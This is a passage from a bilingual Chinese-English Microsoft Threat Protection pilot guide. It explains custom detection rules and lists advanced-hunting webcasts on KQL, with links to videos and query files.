6.  <span data-ttu-id="2a198-365">选择“创建”\*\*\*\*。</span><span class="sxs-lookup"><span data-stu-id="2a198-365">Select **Create**.</span></span> <span data-ttu-id="2a198-366">然后，从导航面板中选择 " **自定义检测规则** "。</span><span class="sxs-lookup"><span data-stu-id="2a198-366">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![菜单中的 "自定义检测规则" 选项的屏幕截图](../../media/mtp/fig27a.png) 

    ![显示规则和执行详细信息的 "检测规则" 页的屏幕截图](../../media/mtp/fig27b.png) 

<span data-ttu-id="2a198-369">在此页面中，您可以选择将打开 "详细信息" 页的检测规则。</span><span class="sxs-lookup"><span data-stu-id="2a198-369">From this page, you can select the detection rule which will open a details page.</span></span> 

!["电子邮件附件" 页面的屏幕截图，可在其中查看规则执行状态、触发通知和操作、编辑检测等情况](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="2a198-371">其他高级的搜寻指导-通过练习</span><span class="sxs-lookup"><span data-stu-id="2a198-371">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="2a198-372">若要了解有关高级搜索的详细信息，下面的网络广播将指导您完成 Microsoft 威胁防护 (MTP) 中的高级搜索功能，以创建跨支柱查询、透视到实体并创建自定义检测项和修正操作。</span><span class="sxs-lookup"><span data-stu-id="2a198-372">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft Threat Protection (MTP) to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="2a198-373">请使用你自己的 GitHub 帐户进行准备，以在试点测试实验室环境中运行搜寻查询。</span><span class="sxs-lookup"><span data-stu-id="2a198-373">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

| <span data-ttu-id="2a198-374">**标题**</span><span class="sxs-lookup"><span data-stu-id="2a198-374">**Title**</span></span> | <span data-ttu-id="2a198-375">**说明**</span><span class="sxs-lookup"><span data-stu-id="2a198-375">**Description**</span></span> | <span data-ttu-id="2a198-376">**下载文件关于**</span><span class="sxs-lookup"><span data-stu-id="2a198-376">**Download MP4**</span></span> | <span data-ttu-id="2a198-377">**在 YouTube 上观看**</span><span class="sxs-lookup"><span data-stu-id="2a198-377">**Watch on YouTube**</span></span> | <span data-ttu-id="2a198-378">**要使用的 CSL 文件**</span><span class="sxs-lookup"><span data-stu-id="2a198-378">**CSL file to use**</span></span> |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="2a198-379">剧集1： KQL 基础知识</span><span class="sxs-lookup"><span data-stu-id="2a198-379">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="2a198-380">我们将介绍 Microsoft 威胁防护中的高级搜寻功能的基础知识。</span><span class="sxs-lookup"><span data-stu-id="2a198-380">We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection.</span></span> <span data-ttu-id="2a198-381">了解可用的高级搜寻数据和基本 KQL 语法和运算符。</span><span class="sxs-lookup"><span data-stu-id="2a198-381">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="2a198-382"> MP4</span><span class="sxs-lookup"><span data-stu-id="2a198-382"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="2a198-383">YouTube</span><span class="sxs-lookup"><span data-stu-id="2a198-383">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="2a198-384">剧集1： Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="2a198-384">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="2a198-385">剧集2：联接</span><span class="sxs-lookup"><span data-stu-id="2a198-385">Episode 2: Joins</span></span> | <span data-ttu-id="2a198-386">我们将继续了解高级搜寻中的数据，以及如何将表格联接在一起。</span><span class="sxs-lookup"><span data-stu-id="2a198-386">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="2a198-387">了解内部、外部、唯一和半连接，以及默认 Kusto innerunique join 的细微差别。</span><span class="sxs-lookup"><span data-stu-id="2a198-387">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="2a198-388">MP4</span><span class="sxs-lookup"><span data-stu-id="2a198-388">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="2a198-389">YouTube</span><span class="sxs-lookup"><span data-stu-id="2a198-389">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="2a198-390">剧集2： Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="2a198-390">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="2a198-391">剧集3：汇总、透视和可视化数据</span><span class="sxs-lookup"><span data-stu-id="2a198-391">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="2a198-392">现在，我们能够筛选、操作和加入数据，可以开始进行汇总、量化、透视和可视化。</span><span class="sxs-lookup"><span data-stu-id="2a198-392">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="2a198-393">在这一过程中，我们将介绍汇总运算符和一些可在高级搜寻架构中深入了解其他表时执行的计算。</span><span class="sxs-lookup"><span data-stu-id="2a198-393">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="2a198-394">我们将数据集转换为可帮助改进分析的图表。</span><span class="sxs-lookup"><span data-stu-id="2a198-394">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="2a198-395">MP4</span><span class="sxs-lookup"><span data-stu-id="2a198-395">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="2a198-396">YouTube</span><span class="sxs-lookup"><span data-stu-id="2a198-396">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="2a198-397">剧集3： Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="2a198-397">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="2a198-398">剧集4：让我们来寻找！</span><span class="sxs-lookup"><span data-stu-id="2a198-398">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="2a198-399">将 KQL 应用于事件跟踪</span><span class="sxs-lookup"><span data-stu-id="2a198-399">Applying KQL to incident tracking</span></span>|<span data-ttu-id="2a198-400">跟踪某些攻击者活动的时间！</span><span class="sxs-lookup"><span data-stu-id="2a198-400">Time to track some attacker activity!</span></span> <span data-ttu-id="2a198-401">在这一段中，我们将利用我们对 Microsoft 威胁防护中的 KQL 和高级搜寻的改进理解来跟踪攻击。</span><span class="sxs-lookup"><span data-stu-id="2a198-401">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft Threat Protection to track an attack.</span></span> <span data-ttu-id="2a198-402">了解字段中用于跟踪攻击者活动的一些提示和技巧，包括 cybersecurity 的 ABCs 以及如何将其应用到事件响应。</span><span class="sxs-lookup"><span data-stu-id="2a198-402">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="2a198-403">MP4</span><span class="sxs-lookup"><span data-stu-id="2a198-403">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="2a198-404">YouTube</span><span class="sxs-lookup"><span data-stu-id="2a198-404">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="2a198-405">剧集4： Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="2a198-405">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="2a198-406">后续步骤</span><span class="sxs-lookup"><span data-stu-id="2a198-406">Next step</span></span>
|<span data-ttu-id="2a198-407">![结束和摘要阶段](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="2a198-407">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="2a198-408">结束和摘要阶段</span><span class="sxs-lookup"><span data-stu-id="2a198-408">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="2a198-409">分析你的 Microsoft 威胁防护试点结果，向你的利益干系人呈现，并采取下一步行动。</span><span class="sxs-lookup"><span data-stu-id="2a198-409">Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
